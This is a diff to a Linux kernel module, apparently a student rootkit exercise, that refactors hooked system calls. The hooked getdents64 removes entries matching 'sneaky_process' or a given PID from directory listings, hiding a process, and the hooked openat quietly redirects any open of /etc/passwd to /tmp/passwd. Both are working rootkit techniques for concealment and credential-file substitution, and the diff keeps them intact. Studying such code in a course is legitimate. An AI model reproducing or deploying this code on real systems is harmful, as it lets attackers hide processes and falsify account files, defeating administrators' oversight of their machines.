@@ -12,6 +12,16 @@
 
 #define PREFIX "sneaky_process"
 
+/* Reference
+https://man7.org/linux/man-pages/man2/read.2.html
+https://www.cs.bham.ac.uk/~exr/lectures/opsys/13_14/docs/kernelAPI/r4037.html
+https://man7.org/linux/man-pages/man2/getdents.2.html
+https://aquasecurity.github.io/tracee/v0.13/docs/events/builtin/syscalls/getdents64/
+https://linux.die.net/man/2/getdents64
+https://cplusplus.com/reference/cstring/memmove/
+https://linux.die.net/man/2/openat
+*/
+
 static char *SNEAKY_PID = "";
 module_param(SNEAKY_PID, charp, 0);
 MODULE_PARM_DESC(SNEAKY_PID, "PID of the sneaky process");
@@ -39,18 +49,22 @@ int disable_page_rw(void *ptr) {
 
 // Helper function used in sneaky getdents64 to check if the process is sneaky
 // and replace it
-bool is_sneaky_process(struct linux_dirent64 *cur) {
-  return (strcmp(cur->d_name, PREFIX) == 0) ||
-         (strcmp(cur->d_name, SNEAKY_PID) == 0);
+bool is_sneaky_process(struct linux_dirent64 *current_entry) {
+  return (strcmp(current_entry->d_name, PREFIX) == 0) ||
+         (strcmp(current_entry->d_name, SNEAKY_PID) == 0);
 }
 
-int remove_entry(struct linux_dirent64 *dirp, struct linux_dirent64 *cur,
+int remove_entry(struct linux_dirent64 *dirp, struct linux_dirent64 *current_entry,
                  int total_len) {
-  char *next = (char *)cur + cur->d_reclen;
+  char *next = (char *)current_entry + current_entry->d_reclen;
   int len = (char *)dirp + total_len - (char *)next;
-  total_len -= cur->d_reclen;
-  memmove(cur, next, len);
+  total_len -= current_entry->d_reclen;
+  memmove(current_entry, next, len);
   return total_len;
+}
+
+struct linux_dirent64* next_entry(struct linux_dirent64* entry) {
+    return (struct linux_dirent64 *)((char *)entry + entry->d_reclen);
 }
 
 // 1. Function pointer will be used to save address of the original 'openat'
@@ -63,32 +77,33 @@ asmlinkage int (*original_read)(struct pt_regs *);
 
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs) {
   struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
-  struct linux_dirent64 *cur_entry = dirp;
+  struct linux_dirent64 *current_entry = dirp;
   int scan = 0;
   int total = (*original_getdents64)(regs);
+
   if (total <= 0) {
     return total;
   }
 
   while (scan < total) {
-    if (is_sneaky_process(cur_entry)) {
-      total = remove_entry(dirp, cur_entry, total);
-      continue;
+    if (is_sneaky_process(current_entry)) {
+      total = remove_entry(dirp, current_entry, total);
+    } else {
+      scan += current_entry->d_reclen;
+      current_entry = next_entry(current_entry);
     }
-    scan += cur_entry->d_reclen;
-    cur_entry =
-        (struct linux_dirent64 *)((char *)cur_entry + cur_entry->d_reclen);
   }
+
   return total;
 }
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
   // Implement the sneaky part here
-  const char *pathname = (const char *)regs->si;
-  if (strcmp(pathname, "/etc/passwd") == 0) {
-    const char *sneaky_path = "/tmp/passwd";
-    copy_to_user((char *)pathname, sneaky_path, strlen(sneaky_path) + 1);
+  const char *original_path = (const char *)regs->si;
+  const char *sneaky_path = "/tmp/passwd";
+  if (strcmp(original_path, "/etc/passwd") == 0) {
+    copy_to_user((char *)original_path, sneaky_path, strlen(sneaky_path) + 1);
   }
   return (*original_openat)(regs);
 }
